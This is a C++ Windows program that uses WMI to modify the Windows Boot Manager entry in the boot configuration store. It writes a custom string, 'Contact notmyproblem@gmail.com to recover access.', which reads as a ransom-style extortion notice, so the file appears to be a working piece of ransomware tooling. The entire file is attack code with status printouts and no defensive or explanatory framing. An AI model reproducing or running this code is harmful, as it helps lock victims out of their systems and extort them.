#include <Windows.h>
#include <stdio.h>
#include <WbemIdl.h>
#include <initguid.h>
#include <comutil.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "comsuppw.lib")

#include "pch.h"

int main()
{
	IWbemLocator* pLoc = nullptr;
	IWbemServices* pSvc = nullptr;

	IWbemClassObject* pClass_BcdObject_StoreFilePath = nullptr;
	IWbemClassObject* pClass_BcdObject = nullptr;

	HRESULT hr = CoInitializeEx(nullptr, COINITBASE_MULTITHREADED);

	if (SUCCEEDED(hr)) {
		printf("[+] Initialized COM library.\n");
	}
	else {
		goto quit;
	}

	hr = CoInitializeSecurity(
		nullptr,						
		-1,								
		nullptr,						
		nullptr,						
		RPC_C_AUTHN_LEVEL_DEFAULT,		
		RPC_C_IMP_LEVEL_IMPERSONATE,	
		nullptr,						
		EOAC_NONE,						
		nullptr							
	);

	if (SUCCEEDED(hr)) {
		printf("[+] Registered security and set the default security values for the process.\n");
	}
	else {
		printf("[-] Failed to register security: 0x%08X\n", hr);
		goto quit;
	}

	hr = CoCreateInstance(
		CLSID_WbemLocator,		
		nullptr,				
		CLSCTX_INPROC_SERVER,	
		IID_IWbemLocator,		
		(void**)&pLoc);

	if (SUCCEEDED(hr)) {
		printf("[+] Initialized IWbemLocator interface.\n");
	}
	else {
		printf("[-] Failed to initialize IWbemLocator interface: 0x%08X\n", hr);
		goto quit;
	}

	hr = pLoc->ConnectServer(
		BSTR(L"ROOT\\WMI"),	
		nullptr,				
		nullptr,				
		nullptr,				
		0,						
		nullptr,				
		nullptr,				
		&pSvc					
	);

	if (SUCCEEDED(hr)) {
		printf("[+] Connected to a local WMI namespace.\n");
	}
	else {
		printf("[-] Failed to connect to a local WMI namespace: 0x%08X\n", hr);
		goto quit;
	}

	hr = CoSetProxyBlanket(
		pSvc,							
		RPC_C_AUTHN_WINNT,				
		RPC_C_AUTHN_NONE,				
		COLE_DEFAULT_PRINCIPAL,			
		RPC_C_AUTHN_LEVEL_CALL,			
		RPC_C_IMP_LEVEL_IMPERSONATE,	
		nullptr,						
		EOAC_DYNAMIC_CLOAKING						
	);

	if (SUCCEEDED(hr)) {
		printf("[+] Set authentication information for IWbemService proxy.\n");
	}
	else {
		printf("[-] Failed to set authentication information for IWbemService proxy: 0x%08X\n", hr);
		goto quit;
	}

	{
		hr = pSvc->GetObject(BSTR(L"BcdObject.Id=\"{9dea862c-5cdd-4e70-acc1-f32b344d4795}\",StoreFilePath=\"\""), 0, nullptr, &pClass_BcdObject_StoreFilePath, nullptr);
		if (SUCCEEDED(hr)) {
			printf("[+] Retrieved an instance of BcdStore.BootMgr.StoreFilePath.\n");
		}
		else {
			printf("[-] Failed to retrieve an instance of BcdStore.BootMgr.StoreFilePath: 0x%08X\n", hr);
			goto quit;
		}

		VARIANT vtBcdStore_StoreFilePath = {};
		hr = pClass_BcdObject_StoreFilePath->Get(L"__PATH", 0, &vtBcdStore_StoreFilePath, nullptr, nullptr);
		if (SUCCEEDED(hr)) {
			printf("[+] Retrieved BcdStore.BootMgt.StoreFilePath __PATH property.\n");
		}
		else {
			printf("[-] Failed to retrieve BcdStore.BootMgr.StoreFilePath __PATH property: 0x%08X\n", hr);
			goto quit;
		}

		hr = pSvc->GetObject(BSTR(L"BcdObject"), 0, nullptr, &pClass_BcdObject, nullptr);
		if (SUCCEEDED(hr)) {
			printf("[+] Retrieved an instance of BcdObject.\n");
		}
		else {
			printf("[-] Failed to retrieve an instance of BcdObject: 0x%08X\n", hr);
			goto quit;
		}

		IWbemClassObject* pInDef_SetStringElement = nullptr;
		IWbemClassObject* pIn_SetStringElement = nullptr;
		IWbemClassObject* pOut_SetStringElement = nullptr;

		hr = pClass_BcdObject->GetMethod(L"SetStringElement", 0, &pInDef_SetStringElement, nullptr);
		if (SUCCEEDED(hr)) {
			printf("[+] Got an instance of input data structure for SetStringElement method.\n");
		}
		else {
			printf("[-] Failed to get an instance of input data for SetStringElement method: 0x%08X\n", hr);
			goto quit;
		}

		hr = pInDef_SetStringElement->SpawnInstance(0, &pIn_SetStringElement);
		if (SUCCEEDED(hr)) {
			printf("[+] Created a new instance of the class.\n");
		}
		else {
			printf("[-] Failed to create a new instance of the class: 0x%08X\n", hr);
			goto quit;
		}

		pInDef_SetStringElement->Release();

		/*
		* boolean SetStringElement(
		* [in] uint32 Type,
		* [in] string String
		* );
		*/

		VARIANT vt = {};
		vt.vt = VT_I4;
		vt.lVal = (LONG)0x22000041;
		hr = pIn_SetStringElement->Put(L"Type", 0, &vt, 0);
		VariantClear(&vt);
		if (SUCCEEDED(hr)) {
			printf("[+] Set up Type for SetStringElement method.\n");
		}
		else {
			printf("[-] Failed to set Type for SetStringElement method: 0x%08X\n", hr);
			goto quit;
		}

		vt.vt = VT_BSTR;
		vt.bstrVal = SysAllocString(L"Contact notmyproblem@gmail.com to recover access.");
		hr = pIn_SetStringElement->Put(L"String", 0, &vt, 0);
		VariantClear(&vt);
		if (SUCCEEDED(hr)) {
			printf("[+] Set up String for SetStringElement method.\n");
		}
		else {
			printf("[-] Failed to set String for SetStringElement method: 0x%08X\n", hr);
			goto quit;
		}

		hr = pSvc->ExecMethod(vtBcdStore_StoreFilePath.bstrVal, BSTR(L"SetStringElement"), 0, NULL, pIn_SetStringElement, &pOut_SetStringElement, nullptr);
		VariantClear(&vtBcdStore_StoreFilePath);
		pIn_SetStringElement->Release();
		if (SUCCEEDED(hr)) {
			printf("[+] Executed IWbemServices::ExecMethod - BcdObject::SetStringElement.\n");
		}
		else {
			printf("[-] Failed to execute IWbemServices::ExecMethod - BcdObject::SetStringElement: 0x%08X\n", hr);
			goto quit;
		}

		hr = pOut_SetStringElement->Get(L"ReturnValue", 0, &vt, nullptr, nullptr);
		if (SUCCEEDED(hr)) {
			printf("[+] Used Get method to retrieve results of BcdObject::SetStringElement method call.\n");
			if (vt.vt == VT_BOOL && vt.boolVal == VARIANT_TRUE) {
				printf("[+] SetStringElement succeeded.\n");
			}
			else {
				printf("[+] SetStringElement failed.\n");
			}
			VariantClear(&vt);
		}
		else {
			printf("[-] Get method failed: 0x%08X\n", hr);
			goto quit;
		}

		VariantClear(&vt);
		pOut_SetStringElement->Release();

	}

quit:

	if (pLoc) { pLoc->Release(); }
	if (pSvc) { pSvc->Release(); }
	if (pClass_BcdObject_StoreFilePath) { pClass_BcdObject_StoreFilePath->Release(); }
	if (pClass_BcdObject) { pClass_BcdObject->Release(); }

	CoUninitialize();
	return 0;
}
